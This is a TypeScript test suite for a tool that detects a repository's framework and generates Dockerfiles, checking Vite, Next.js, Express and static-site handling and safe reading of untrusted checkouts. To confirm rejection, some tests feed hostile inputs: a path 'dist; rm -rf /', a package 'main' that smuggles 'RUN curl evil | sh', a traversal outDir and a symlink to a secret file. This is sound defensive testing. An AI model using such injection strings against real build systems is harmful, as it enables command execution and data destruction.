process.env.NODE_ENV = 'test';

import { mkdtemp, mkdir, rm, symlink, writeFile } from 'fs/promises';
import os from 'os';
import path from 'path';
import { buildctlArgs, dockerBuildArgs } from '../src/lib/buildSandbox';
import { buildArgKeysFor, detectProject, pickNodeVersion, safeRelPath, type RepoFiles } from '../src/lib/detect';
import { fsRepoFiles } from '../src/lib/repoFiles';

// In-memory repo: { 'package.json': '...', 'yarn.lock': '' }
const repo = (files: Record<string, string>): RepoFiles => ({
  exists: async (p) => p in files,
  read: async (p) => files[p] ?? null,
});
const pkg = (o: object) => JSON.stringify(o);

async function gen(files: Record<string, string>, envKeys: string[] = []) {
  const d = await detectProject(repo(files), { envKeys });
  if (d.kind !== 'generated') throw new Error(`expected a generated Dockerfile, got ${JSON.stringify(d)}`);
  return d;
}

describe('pickNodeVersion', () => {
  it('maps engines.node onto an available image', () => {
    expect(pickNodeVersion('>=18')).toBe(18);
    expect(pickNodeVersion('^20.1.0')).toBe(20);
    expect(pickNodeVersion('20.x')).toBe(20);
    expect(pickNodeVersion('21')).toBe(22); // no 21 image: next one up
    expect(pickNodeVersion('>=16')).toBe(18);
    expect(pickNodeVersion('99')).toBe(24);
  });
  it('defaults when there is no usable range', () => {
    expect(pickNodeVersion(undefined)).toBe(22);
    expect(pickNodeVersion('lts/*')).toBe(22);
  });
});

describe('safeRelPath', () => {
  it('accepts plain relative paths', () => {
    expect(safeRelPath('dist')).toBe('dist');
    expect(safeRelPath('./build/')).toBe('build');
    expect(safeRelPath('apps/web/dist')).toBe('apps/web/dist');
  });
  it('rejects anything that could escape or inject', () => {
    for (const bad of ['../x', '/etc', 'a/../../b', 'dist; rm -rf /', 'a b', '-rf', '', undefined]) expect(safeRelPath(bad as any)).toBeNull();
  });
});

describe('detectProject: priority', () => {
  it('a repo Dockerfile always wins, even next to a package.json', async () => {
    expect((await detectProject(repo({ Dockerfile: 'FROM x', 'package.json': pkg({ dependencies: { next: '1' } }) }))).kind).toBe('dockerfile');
  });
});

describe('detectProject: Vite', () => {
  const files = { 'package.json': pkg({ scripts: { build: 'vite build' }, devDependencies: { vite: '5' } }), 'package-lock.json': '{}' };
  it('builds to dist and serves it with nginx on $PORT, with SPA fallback', async () => {
    const d = await gen(files);
    expect(d.framework).toBe('Vite');
    expect(d.dockerfile).toContain('FROM node:22-slim AS build');
    expect(d.dockerfile).toContain('RUN npm ci');
    expect(d.dockerfile).toContain('RUN npm run build');
    expect(d.dockerfile).toContain('FROM nginx:stable-alpine');
    expect(d.dockerfile).toContain('COPY --from=build /app/dist /usr/share/nginx/html');
    expect(d.dockerfile).toContain('listen ${PORT};');
    expect(d.dockerfile).toContain('try_files $uri $uri/ /index.html;');
  });
  it('fails the build with a clear message when the output folder is missing', async () => {
    expect((await gen(files)).dockerfile).toMatch(/test -d dist \|\| \(echo "==> The build finished but there is no 'dist' folder/);
  });
  it('reads a custom build.outDir from the vite config', async () => {
    const d = await gen({ ...files, 'vite.config.ts': "export default { build: { outDir: 'public_html' } }" });
    expect(d.dockerfile).toContain('/app/public_html');
  });
  it('ignores a malicious outDir', async () => {
    const d = await gen({ ...files, 'vite.config.ts': "export default { build: { outDir: '../../etc' } }" });
    expect(d.dockerfile).toContain('/app/dist');
    expect(d.dockerfile).not.toContain('../');
  });
  it('passes only VITE_ variables to the build', async () => {
    const d = await gen(files, ['VITE_API_URL', 'DATABASE_URL', 'NEXT_PUBLIC_X', 'VITE_']);
    expect(d.buildArgKeys).toEqual(['VITE_API_URL', 'VITE_']);
    expect(d.dockerfile).toContain('ARG VITE_API_URL');
    expect(d.dockerfile).not.toContain('DATABASE_URL');
  });
  it('does not treat a Vite-based SSR framework (SvelteKit) as a static site', async () => {
    const d = await gen({ 'package.json': pkg({ scripts: { build: 'vite build', start: 'node build' }, devDependencies: { vite: '5', '@sveltejs/kit': '2' } }) });
    expect(d.framework).toMatch(/Node server/);
    expect(d.dockerfile).toContain('CMD ["npm", "start"]');
  });
});

describe('detectProject: Next.js', () => {
  const files = { 'package.json': pkg({ scripts: { build: 'next build', start: 'next start' }, dependencies: { next: '15', react: '19' } }), 'yarn.lock': '' };
  it('builds, then runs next start on $PORT', async () => {
    const d = await gen(files);
    expect(d.framework).toBe('Next.js');
    expect(d.dockerfile).toContain('corepack enable && yarn install --frozen-lockfile');
    expect(d.dockerfile).toContain('RUN yarn build');
    expect(d.dockerfile).toContain('-p ${PORT:-3000}');
    expect(d.dockerfile).not.toContain('nginx');
  });
  it('treats output: "export" as a static site', async () => {
    const d = await gen({ ...files, 'next.config.mjs': "export default { output: 'export' }" });
    expect(d.framework).toBe('Next.js (static export)');
    expect(d.dockerfile).toContain('COPY --from=build /app/out /usr/share/nginx/html');
    expect(d.dockerfile).toContain('$uri.html');
  });
  it('passes NEXT_PUBLIC_ variables to the build', async () => {
    expect((await gen(files, ['NEXT_PUBLIC_API', 'SECRET'])).buildArgKeys).toEqual(['NEXT_PUBLIC_API']);
  });
});

describe('detectProject: Create React App', () => {
  it('serves the build folder', async () => {
    const d = await gen({ 'package.json': pkg({ scripts: { build: 'react-scripts build' }, dependencies: { 'react-scripts': '5' } }) });
    expect(d.framework).toBe('Create React App');
    expect(d.dockerfile).toContain('/app/build');
    expect(d.dockerfile).toContain('RUN npm install'); // no lockfile
  });
});

describe('detectProject: Node servers (Express and friends)', () => {
  it('runs "node server.js" directly', async () => {
    const d = await gen({ 'package.json': pkg({ scripts: { start: 'node server.js' }, dependencies: { express: '4' } }), 'package-lock.json': '{}' });
    expect(d.framework).toBe('Express');
    expect(d.dockerfile).toContain('CMD ["node", "server.js"]');
    expect(d.dockerfile).not.toContain('RUN npm run build');
  });
  it('uses npm start for anything more complex, and runs the build script first', async () => {
    const d = await gen({ 'package.json': pkg({ scripts: { build: 'tsc', start: 'node dist/index.js --port 3000' }, dependencies: { express: '4' } }) });
    expect(d.dockerfile).toContain('RUN npm run build');
    expect(d.dockerfile).toContain('CMD ["npm", "start"]');
  });
  it('falls back to main, then to well-known entry files', async () => {
    expect((await gen({ 'package.json': pkg({ main: 'src/app.js' }) })).dockerfile).toContain('CMD ["node", "src/app.js"]');
    expect((await gen({ 'package.json': pkg({}), 'server.js': '' })).dockerfile).toContain('CMD ["node", "server.js"]');
  });
  it('explains what is missing when it cannot tell how to start the app', async () => {
    const d = await detectProject(repo({ 'package.json': pkg({ name: 'lib' }) }));
    expect(d).toMatchObject({ kind: 'unsupported' });
    expect((d as any).reason).toMatch(/start/);
  });
  it('uses engines.node and the repo package manager', async () => {
    const d = await gen({ 'package.json': pkg({ engines: { node: '>=18' }, scripts: { start: 'node a.js' } }), 'pnpm-lock.yaml': '' });
    expect(d.dockerfile).toContain('FROM node:18-slim');
    expect(d.dockerfile).toContain('pnpm install --frozen-lockfile');
    expect(d.dockerfile).toContain('CMD ["node", "a.js"]');
  });
  it('never puts a hostile "main" into the Dockerfile', async () => {
    const d = await detectProject(repo({ 'package.json': pkg({ main: 'x"]; RUN curl evil | sh #' }) }));
    expect(d.kind).toBe('unsupported');
  });
});

describe('detectProject: no package.json', () => {
  it('serves plain HTML with nginx (404 for unknown paths)', async () => {
    const d = await gen({ 'index.html': '<h1>hi</h1>' });
    expect(d.framework).toBe('Static site');
    expect(d.dockerfile).toContain('COPY . /usr/share/nginx/html');
    expect(d.dockerfile).toContain('try_files $uri $uri/ =404;');
  });
  it('tells Python/Go/Java users to add a Dockerfile', async () => {
    const d = await detectProject(repo({ 'requirements.txt': 'flask' }));
    expect(d).toMatchObject({ kind: 'unsupported' });
    expect((d as any).reason).toMatch(/Python.*Dockerfile/);
  });
  it('rejects broken package.json and empty repos', async () => {
    expect(await detectProject(repo({ 'package.json': '{oops' }))).toMatchObject({ kind: 'unsupported' });
    expect(await detectProject(repo({}))).toMatchObject({ kind: 'unsupported' });
  });
});

describe('buildArgKeysFor', () => {
  it('only knows the public prefixes of frameworks that inline them', () => {
    expect(buildArgKeysFor('cra', ['REACT_APP_A', 'X'])).toEqual(['REACT_APP_A']);
    expect(buildArgKeysFor('node', ['VITE_A'])).toEqual([]);
  });
});

describe('build args reach the build', () => {
  it('buildctl gets --opt build-arg:K=V, one per variable, never through a shell', () => {
    const args = buildctlArgs({ addr: 'a', contextDir: '/c', imageTag: 't', tarPath: '/t', buildArgs: { VITE_A: 'x y', VITE_B: 'z' } });
    expect(args.slice(-4)).toEqual(['--opt', 'build-arg:VITE_A=x y', '--opt', 'build-arg:VITE_B=z']);
    expect(buildctlArgs({ addr: 'a', contextDir: '/c', imageTag: 't', tarPath: '/t' })).not.toContain('--opt');
  });
  it('docker fallback uses --build-arg', () => {
    expect(dockerBuildArgs({ VITE_A: '1' })).toEqual(['--build-arg', 'VITE_A=1']);
    expect(dockerBuildArgs()).toEqual([]);
  });
});

describe('fsRepoFiles (reads an untrusted checkout)', () => {
  let dir: string;
  beforeEach(async () => (dir = await mkdtemp(path.join(os.tmpdir(), 'devflow-detect-'))));
  afterEach(() => rm(dir, { recursive: true, force: true }));

  it('reads regular files', async () => {
    await writeFile(path.join(dir, 'package.json'), '{"a":1}');
    const f = fsRepoFiles(dir);
    expect(await f.exists('package.json')).toBe(true);
    expect(await f.read('package.json')).toBe('{"a":1}');
    expect(await f.exists('nope')).toBe(false);
    expect(await f.read('nope')).toBeNull();
  });
  it('treats symlinks as missing so the repo cannot make the worker read its own files', async () => {
    const secret = path.join(os.tmpdir(), `secret-${Date.now()}`);
    await writeFile(secret, 'TOP SECRET');
    await symlink(secret, path.join(dir, 'package.json'));
    const f = fsRepoFiles(dir);
    expect(await f.exists('package.json')).toBe(false);
    expect(await f.read('package.json')).toBeNull();
    await rm(secret, { force: true });
  });
  it('skips oversized files', async () => {
    await mkdir(path.join(dir, 'x'));
    await writeFile(path.join(dir, 'x', 'big.json'), 'a'.repeat(1024 * 1024 + 1));
    expect(await fsRepoFiles(dir).read('x/big.json')).toBeNull();
  });
});
